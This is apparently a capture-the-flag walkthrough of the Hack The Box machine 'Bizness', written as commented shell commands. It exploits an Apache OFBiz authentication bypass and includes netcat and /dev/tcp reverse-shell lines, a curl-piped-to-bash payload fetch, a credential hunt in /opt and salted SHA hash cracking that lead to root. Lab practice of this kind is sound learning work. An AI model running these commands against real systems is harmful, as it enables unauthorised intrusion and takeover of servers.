## Machine Bizness
```sh
nmap -p- -sV -sC --min-rate=100000 10.129.202.3
nmap -p- -sV -sC --min-rate=100000 10.129.202.3 --script vuln
echo "10.129.202.3 bizness.htb" | sudo tee -a /etc/hosts
#OWASP Zap detected an SQL Injection
sqlmap -u "https://bizness.htb/"
#that seems to be only a possible ddos chance
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://bizness.htb/
#gobuster didnt worked
#so i used dirbuster
#and found https://bizness.htb/control/login
#Here I could see its Apache OFBiz used
#Which is exploitable iI searched a bit for and easy to use exploit and found this:
# https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?trk=article-ssr-frontend-pulse_little-text-block&source=post_page-----b5bed59a7598--------------------------------
nc -lvnp 8001 # started listener
python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.190 8001' #and executed the exploit this gives a sehll
cat /home/ofbiz/user.txt  #on target server
python3 -m http.server 8001
echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/1338 0>&1'" > shell.sh
nc -lvnp 1338
curl 10.10.14.190:8001/shell.sh|bash #on target server this gives a full shell
grep -ri "password" /opt #to much results
grep -ri "admin" /opt #to much results
grep -ri "root" /opt #to much results
grep -r "SHA" /opt #to much results
find /opt -type f -iname "*login*"
#found /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
#{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a
#no idea how to dehash that tried with john doesnt worked
#researched and found some github cause other mentioned it
git clone https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker
python3 OFBiz-crack.py --hash-string '$SHA$d$47ca69ebb4bdc9ae0adec130880165d2cc05db1a'
#doesnt work need salt
#i tried more around and consolidate internet and somewhen found this 
grep -r --include=\*.dat "currentPassword" /opt
python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
# got the password
#tried to login via ssh didnt worked
su root #in server shell
cat ~/root.txt
# gave the flag
```